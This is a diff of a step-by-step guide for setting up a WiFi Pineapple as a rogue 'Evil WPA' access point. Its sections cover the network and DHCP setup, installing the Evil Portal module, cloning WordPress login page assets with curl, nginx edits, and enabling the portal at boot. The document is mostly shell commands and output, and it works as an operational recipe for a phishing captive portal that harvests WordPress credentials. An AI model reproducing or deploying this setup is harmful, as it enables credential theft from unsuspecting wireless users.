@@ -1,15 +1,54 @@
-1) Enable "Evil WPA" Access Point:
+1. Configure the Evil WPA access point:
 
 a) Connect to the WiFi Pineapple Admin Portal at 172.16.42.1:1471
 
-b) Enable your "Evil WPA" Access Point (http://172.16.42.1:1471/#/PineAP/aps) with a secret password 
-
-c) Ensure your "Open" Access Point is hidden (http://172.16.42.1:1471/#/PineAP/open)
-
+b) Ensure your "Open" Access Point is hidden (http://172.16.42.1:1471/#/PineAP/open)
 (This will prevent unauthorized access to your access point. For added security, add your device's MAC address to the "Client Filter" allow list: http://172.16.42.1:1471/#/PineAP/filtering.)
 
+c) Configure and Enable your "Evil WPA" Access Point:
+
+PS C:\Users\user> ssh root@172.16.42.1
+
+root@mk7:~# IFS= read -r -d '' SSID <<'EOF'
+[Random WPA Network Name]
+EOF
+
+root@mk7:~# uci set wireless.@wifi-iface[3].ssid=$SSID
+
+root@mk7:~# IFS= read -r -d '' PSK <<'EOF'
+[Strong WPA Passphrase]
+EOF
+
+root@mk7:~# uci set wireless.@wifi-iface[3].key=$PSK
+
+root@mk7:~# uci set wireless.@wifi-iface[3].disabled=0
+
+root@mk7:~# uci commit wireless
+
+root@mk7:~# wifi reload
+
 -------------------------------------------------------------------------------------------------------------
-2). Install "Evil Portal" on the WiFi Pineapple:
+2. Configure rogue-AP networking:
+
+root@mk7:~# echo -e "\nconfig device\n        option name 'br-evil'\n        option type 'bridge'\n\nconfig interface 'evil'\n        option device 'br-evil'\n        option proto 'static'\n        option ipaddr '10.0.0.1'\n        option netmask '255.255.255.0'" >> /etc/config/network
+
+root@mk7:~# echo -e "\nconfig dhcp 'evil'\n        option interface 'evil'\n        option start '100'\n        option limit '150'\n        option leasetime '1h'" >> /etc/config/dhcp
+
+root@mk7:~# sed -i '49s/lan/evil/' /etc/config/wireless
+
+-------------------------------------------------------------------------------------------------------------
+3. Apply changes and restart services:
+
+root@mk7:~# /etc/init.d/network restart
+
+PS C:\Users\user> ssh root@172.16.42.1
+
+root@mk7:~# /etc/init.d/dnsmasq restart
+
+root@mk7:~# wifi reload
+
+-------------------------------------------------------------------------------------------------------------
+4. Install the "Evil Portal" Module:
 
 a) Connect to the Internet
     i.) Ethernet Connection: Connect ethernet cable to the wifi pineapple (using a USB adapter). Confirm under "Settings -> Networking -> Ethernet" that you have obtained an IP address from DHCP.
@@ -40,7 +79,20 @@ l) Wait for the "Welcome to Evil Portal ... Install Dependencies" screen. (If yo
 m) Click "Install Dependencies" and wait until the dependencies finish installation. (If you have a weak internet connection, open a new tab to confirm if the process finished.)
 
 -------------------------------------------------------------------------------------------------------------
-3. Create a New Captive Portal:
+5. Configure Evil Portal files and routing:
+
+root@mk7:~# sed -i "s/172\.16\.42\.1/10.0.0.1/g" /pineapple/modules/evilportal/module.py
+
+root@mk7:~# sed -i 's/172\.16\.42\.1/10.0.0.1/g' /etc/init.d/evilportal
+
+root@mk7:~# sed -i 's/172\.16\.42\.1/10.0.0.1/g' /pineapple/ui/modules/evilportal/assets/evilportal.sh
+
+root@mk7:~# sed -i 's/br-lan/br-evil/g' /etc/init.d/evilportal
+
+root@mk7:~# sed -i 's/br-lan/br-evil/g' /pineapple/ui/modules/evilportal/assets/evilportal.sh
+
+-------------------------------------------------------------------------------------------------------------
+6. Create a New Captive Portal:
 
 a) Next to "Portal Library" click: "New Portal".
 
@@ -51,26 +103,23 @@ c) For "Portal Name", enter "Wordpress" and click "Done".
 (Note: You do not need to click "Activate". The captive portal will be activated later, during the setup process.) 
 
 -------------------------------------------------------------------------------------------------------------
-4. Delete the default EvilPortal configuration files:
+7. Delete the default EvilPortal configuration files:
 
-a) Open the Terminal (in the top-right corner of the admin portal). 
-(If you don’t see a prompt, click inside the shell and press Enter to refresh it.)
-
-b) Confirm the Default Files were created
+a) Confirm the Default Files were created
 
 root@mk7:~# ls /root/portals/Wordpress/
 MyPortal.php  Wordpress.ep  helper.php    index.php
 
-c) Delete the Default Files
+b) Delete the Default Files
 
 root@mk7:~# rm -f /root/portals/Wordpress/*
 
-d) Confirm the Default Files were deleted
+c) Confirm the Default Files were deleted
 
 root@mk7:~# ls /root/portals/Wordpress/
 
 -------------------------------------------------------------------------------------------------------------
-5. Download the web-root files from the GitHub repository:
+8. Download the web-root files from the GitHub repository:
 
 PS C:\Users\user\> wsl -d kali-linux
 ┏━(Message from Kali developers)
@@ -156,7 +205,7 @@ auth-relay-framework
 27 directories, 38 files
 
 -------------------------------------------------------------------------------------------------------------
-6. Ensure the Web Root files aren't corrupted (0 bytes):
+9. Ensure the Web Root files aren't corrupted (0 bytes):
 
 ┌──(kali㉿computername)-[/mnt/c/Users/user]
 └─$ ls -lah auth-relay-framework/wordpress/captive-portal/setup/pineapple/web-root
@@ -177,7 +226,7 @@ drwxrwxrwx 1 kali kali  512 Nov 22 10:51 ..
 -rwxrwxrwx 1 kali kali  129 Nov 22 10:51 Wordpress.ep
 
 -------------------------------------------------------------------------------------------------------------
-7. Transfer the Web Root files to the EvilPortal source directory:
+10. Transfer the Web Root files to the EvilPortal source directory:
 
 ┌──(kali㉿computername)-[/mnt/c/Users/user/]
 └─$ scp ./auth-relay-framework/wordpress/captive-portal/setup/pineapple/web-root/* root@172.16.42.1:/root/portals/Wordpress/
@@ -196,7 +245,7 @@ success.html                           100%  866   350.9KB/s   00:00
 Wordpress.ep                           100%  129    62.4KB/s   00:00
 
 -------------------------------------------------------------------------------------------------------------
-8. Download the Wordpress Static Format Files:
+11. Download the Wordpress Static Format Files:
 
 ┌──(kali㉿computername)-[/mnt/c/Users/user/]
 └─$ mkdir wordpress
@@ -232,7 +281,7 @@ Wordpress.ep                           100%  129    62.4KB/s   00:00
 └─$ curl -s "https://wordpress.com/wp-includes/fonts/dashicons.eot" > wp-includes/fonts/dashicons.eot
 
 -------------------------------------------------------------------------------------------------------------
-9. Ensure the static format files are not corrupted (0 bytes):
+12. Ensure the static format files are not corrupted (0 bytes):
 
 ┌──(kali㉿computername)-[/mnt/c/Users/user/wordpress]
 └─$ ls -lahR wp-login.css wp-scripts.js images/ wp-includes/
@@ -261,7 +310,7 @@ drwxrwxrwx 1 kali kali 512 Oct 12 11:46 ..
 -rwxrwxrwx 1 kali kali 26K Oct 12 11:46 dashicons.woff2
 
 -------------------------------------------------------------------------------------------------------------
-10. Transfer the Wordpress Static Format Files to the EvilPortal source directory:
+13. Transfer the Wordpress Static Format Files to the EvilPortal source directory:
 
 ┌──(kali㉿computername)-[/mnt/c/Users/user/wordpress]
 └─$ scp -r wp-login.css wp-scripts.js images/ wp-includes/ root@172.16.42.1:/root/portals/Wordpress/
@@ -275,7 +324,9 @@ dashicons.ttf                          100%   55KB   1.6MB/s   00:00
 dashicons.woff2                        100%   26KB   1.3MB/s   00:00
 
 -------------------------------------------------------------------------------------------------------------
-11. Confirm all necessary files have been Transferred EvilPortal source directory:
+14. Confirm all necessary files have been Transferred EvilPortal source directory:
+
+Back in SSH Shell:
 
 root@mk7:~# find /root/portals/Wordpress/ | sed 's|[^/]*/|  |g'
         
@@ -305,7 +356,7 @@ root@mk7:~# find /root/portals/Wordpress/ | sed 's|[^/]*/|  |g'
         success.html
 
 -------------------------------------------------------------------------------------------------------------
-12. Deploy Portal and Confirm Activation:
+15. Deploy Portal and Confirm Activation:
 
 a) Create symbolic links for the Evil Portal web root files
 
@@ -342,17 +393,12 @@ b) Refresh the EvilPortal module page to confirm the portal is now activated
 (Note: You won't be able to preview the portal until the web server is started.)
 
 -------------------------------------------------------------------------------------------------------------
-13. SSH into the WiFi Pineapple to get a full TTY shell:
-
-PS C:\Users\user> ssh root@172.16.42.1
-
--------------------------------------------------------------------------------------------------------------
-14. Back Up the Current Nginx Config:
+16. Back Up the Current Nginx Config:
 
 root@mk7:~# cp /etc/nginx/nginx.conf /etc/nginx/nginx.conf.bak
 
 -------------------------------------------------------------------------------------------------------------
-15. Add location blocks inside the server block of the Nginx configuration file:
+17. Add location blocks inside the server block of the Nginx configuration file:
 
 root@mk7:~# vim /etc/nginx/nginx.conf
 
@@ -393,7 +439,7 @@ root@mk7:~# cat /etc/nginx/nginx.conf
 ```
 
 -------------------------------------------------------------------------------------------------------------
-16. Test Nginx Configuration and Reboot Pineapple:
+18. Test Nginx Configuration and Reboot Pineapple:
 
 a) Test NGINX Configuration
 
@@ -408,7 +454,7 @@ root@mk7:~# reboot
 (This will reload nginx and start the web server)
 
 -------------------------------------------------------------------------------------------------------------
-17. Confirm the Web Portal is started and Preview the Portal:
+19. Confirm the Web Portal is started and Preview the Portal:
 
 a) Return to the Evil Portal module page (http://172.16.42.1:1471/#/Modules/evilportal)
 
@@ -421,13 +467,10 @@ Troubleshooting:
 - If the page preview displays incorrectly, verify that the WordPress core static assets (CSS/JS files) are present and uncorrupted.
 
 -------------------------------------------------------------------------------------------------------------
-18. Starting and Enabling the Evil Portal at Boot:
+20. Starting and Enabling the Evil Portal at Boot:
 
 a) Click "Start"
 (This will create the "Allowed Clients" list (/tmp/EVILPORTAL_CLIENTS.txt) and deny internet access to clients unless they successfully log in to the captive portal).
 
 b) Click "Enable on boot"
-(This will start the captive portal at system boot and ensure the "Allowed Clients" list is cleared following a reboot. Otherwise clients will maintain persistent internet access.)
-
-c) Add your Android's private IP to the "Allowed Clients" list 
-(This will allow your android to securely connect to the Wordpress domain.)
+(This will start the captive portal when the system boots)
